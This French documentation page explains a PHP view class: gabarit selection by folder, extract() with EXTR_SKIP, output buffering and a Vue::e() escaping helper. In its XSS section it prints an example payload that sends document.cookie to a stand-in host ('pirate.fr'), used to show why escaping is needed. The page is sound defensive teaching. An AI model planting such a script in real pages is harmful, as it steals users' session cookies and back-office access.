# `app/Vue.php` — transformer des données en page HTML

> ⏱️ **Lecture : ~15 min** · 1134 mots, 37 lignes de code

> **À lire avec** [layout.php.md](views/layout_back.php.md), les deux fonctionnent ensemble.

## Le rôle

Un contrôleur récupère des données (une liste de commerçants). Il faut les transformer en HTML. C'est le travail de la **vue**, et cette classe est le petit moteur qui les exécute.

On n'utilise **aucun moteur de template** (Twig, Blade…). PHP sait déjà mélanger HTML et données — c'est même sa raison d'être historique. Une vue est donc simplement un fichier PHP qui produit du HTML.

## Le choix du gabarit — une ligne, zéro configuration

```php
$estBack = str_starts_with($chemin, 'back/');
```

Le **dossier de la vue** décide de son habillage : `back/commercants` prend la barre latérale, `front/connexion` l'en-tête horizontal.

Pourquoi cette convention plutôt qu'un paramètre explicite ? Parce qu'elle **existe déjà trois fois** dans le projet — les dossiers `views/back` et `views/front`, les fichiers `back_routes.php` et `front_routes.php`, le préfixe d'URL `/back`. La réutiliser n'ajoute aucune règle à retenir, et surtout : **on ne peut pas oublier de préciser le gabarit**, puisque le chemin est obligatoire.

L'alternative — `Vue::afficher($chemin, $donnees, $titre, 'back')` — a un mode de panne bien pire : avec une valeur par défaut `'front'`, les contrôleurs back continueraient de fonctionner mais rendraient leurs vues **dans le mauvais habillage**. Pas d'erreur PHP, pas de 500, juste un écran faux. Exactement le bug qu'on ne découvre qu'en démonstration.

Une échappatoire existe (`$options['gabarit']`) si un jour une page de back doit s'afficher sans menu.

## `$donnees` et `$options` — deux tableaux, deux rôles

| | Contenu | Destinataire |
|---|---|---|
| `$donnees` | la liste des commerçants, le filtre… | **la vue** |
| `$options` | fil d'Ariane, sous-titre, boutons, onglets | **le bandeau** |

La séparation n'est pas cosmétique : `$donnees` passe par `extract()`, donc y ajouter des clés génériques (`titre`, `actions`) multiplierait les collisions avec les variables métier des vues.

`$options` est le **quatrième** paramètre, avec une valeur par défaut `[]` — les appels existants à trois arguments continuent de fonctionner sans modification.

## L'entrée de menu active

Trois règles, de la plus explicite à la plus automatique :

1. `$options['menu']` si le contrôleur l'a précisé ;
2. la table `parents` de `menu_back.php` (écrans de détail) ;
3. sinon **le dernier segment du chemin** : `back/commercants` → `commercants`.

C'est la règle 3 qui rend le système supportable : la grande majorité des écrans porte déjà le bon nom et ne demande **aucune configuration**. Seules les exceptions — les fiches de détail — sont listées.

Sans la règle 2, ouvrir une fiche ferait *perdre toute position dans le menu* : plus rien de surligné, on ne sait plus où l'on est.

## `afficher()` — le point d'entrée

```php
Vue::afficher('back/commercants', [
    'config' => $this->config,
    'commercants' => $commercants,
], 'Liste des commerçants');
```

Trois choses : quelle vue, quelles données, quel titre d'onglet. La classe s'occupe du reste : exécuter la vue, puis insérer son résultat dans le gabarit commun.

## `extract()` — du tableau aux variables

```php
extract($donnees);
```

`extract` transforme les clés d'un tableau en variables :

```php
['commercants' => [...], 'villeFiltre' => 'Paris']
// devient, à l'intérieur de la vue :
$commercants = [...];
$villeFiltre = 'Paris';
```

C'est ce qui permet d'écrire `<?= $villeFiltre ?>` dans la vue plutôt que `<?= $donnees['villeFiltre'] ?>` partout.

### `EXTR_SKIP` — une correction de sécurité, pas un détail

```php
extract($donnees, EXTR_SKIP);
```

Sans ce second argument, `extract` **écrase** les variables déjà présentes. Or `$fichier` est calculé juste avant, et utilisé juste après :

```php
$fichier = __DIR__ . '/views/' . $chemin . '.php';
extract($donnees);        // <- si $donnees contient 'fichier', il est écrasé
require $fichier;         // <- on charge alors un fichier arbitraire
```

Une vue à qui l'on passerait `['fichier' => ...]` — ce qui n'a rien d'absurde pour un écran de documents de bénévoles — ferait charger n'importe quel fichier du serveur. `EXTR_SKIP` demande à `extract` de ne **jamais** remplacer une variable existante.

⚠️ Plus généralement, `extract` a mauvaise réputation : appliqué à des données de l'utilisateur (`extract($_POST)`), il laisserait n'importe qui écraser n'importe quelle variable. Ici le tableau vient de **nos** contrôleurs — mais `EXTR_SKIP` supprime le risque même en cas d'inattention.

## La temporisation de sortie — le mécanisme clé

C'est la partie la moins évidente du fichier.

```php
ob_start();          // « à partir de maintenant, n'affiche rien, garde tout de côté »
require $fichier;    // la vue s'exécute et produit du HTML
return ob_get_clean(); // « donne-moi ce que tu as gardé, et arrête »
```

**Le problème résolu.** Par défaut, quand un fichier PHP produit du HTML, celui-ci part **immédiatement** vers le navigateur. Or on veut d'abord l'en-tête du site, puis le contenu, puis le pied de page. Si la vue s'affichait toute seule, le contenu partirait **avant** l'en-tête et la page sortirait dans le désordre.

`ob_start()` (*output buffering*) met l'affichage en pause et stocke tout dans une mémoire tampon. `ob_get_clean()` récupère ce contenu sous forme de **chaîne de caractères** et vide le tampon.

On obtient ainsi le HTML de la vue dans une variable `$contenu`, qu'on peut placer où on veut dans le gabarit :

```php
<main class="contenu">
    <?= $contenu ?>
</main>
```

Second bénéfice : la session et les redirections continuent de fonctionner, puisque rien n'est réellement envoyé tant que la page n'est pas complète.

## `Vue::e()` — la protection contre les failles XSS

```php
public static function e(?string $texte): string
{
    return htmlspecialchars($texte ?? '', ENT_QUOTES, 'UTF-8');
}
```

**À appliquer à toute donnée affichée.** Sans exception.

### Le danger, concrètement

Imagine qu'on enregistre un commerçant dont la raison sociale est :

```html
<script>fetch('http://pirate.fr?vol='+document.cookie)</script>
```

Sans protection, ce texte est inséré tel quel dans la page. Le navigateur ne voit pas du texte : il voit une **balise `<script>`** et l'exécute. Le script envoie alors le cookie de session de la personne qui consulte la page — donc **son accès au back-office**.

C'est une faille **XSS** (*Cross-Site Scripting*), l'une des plus répandues sur le web.

### Ce que fait la protection

`htmlspecialchars` convertit les caractères spéciaux du HTML :

| Avant | Après | Effet |
|---|---|---|
| `<` | `&lt;` | plus de balise |
| `>` | `&gt;` | plus de balise |
| `"` | `&quot;` | plus de sortie d'attribut |
| `&` | `&amp;` | |

Le navigateur **affiche** alors `<script>...</script>` comme du texte visible, au lieu de l'exécuter.

Le paramètre `ENT_QUOTES` est important : il échappe aussi les **apostrophes simples**. Sans lui, un texte inséré dans un attribut délimité par des apostrophes (`value='...'`) pourrait en sortir. `'UTF-8'` garantit que les accents ne sont pas cassés au passage.

### La règle

> **Toute donnée qui vient de l'utilisateur ou de l'API passe par `Vue::e()`.**

Même le nom d'un commerçant saisi par un collègue de confiance : on ne protège pas contre les personnes, on protège contre les **données**. Et une donnée peut arriver par un autre chemin plus tard (import, API partenaire, formulaire public).

Dans les vues, ça donne :

```php
<td><?= Vue::e($c['raison_sociale'] ?? '') ?></td>
```

Le `?? ''` évite un avertissement PHP si l'API n'a pas renvoyé ce champ.

## Question probable en live coding

**« Pourquoi ne pas avoir utilisé Twig ? »**

Même logique que pour l'API (Go sans framework, cURL sans Guzzle) : PHP fait déjà le travail, et ces 70 lignes sont entièrement explicables. Twig apporterait un échappement automatique — un vrai avantage — mais au prix d'une dépendance, d'une syntaxe supplémentaire à apprendre, et d'une boîte noire de plus à justifier. Ici, l'échappement est explicite via `Vue::e()` : plus verbeux, mais on voit exactement où il s'applique.

## Fichiers liés

- [views/layout_back.php.md](views/layout_back.php.md) — les deux gabarits et leurs blocs
- [controllers/back/CommercantsController.php.md](Controllers/Back/CommercantsController.php.md) — un contrôleur qui appelle `Vue::afficher`
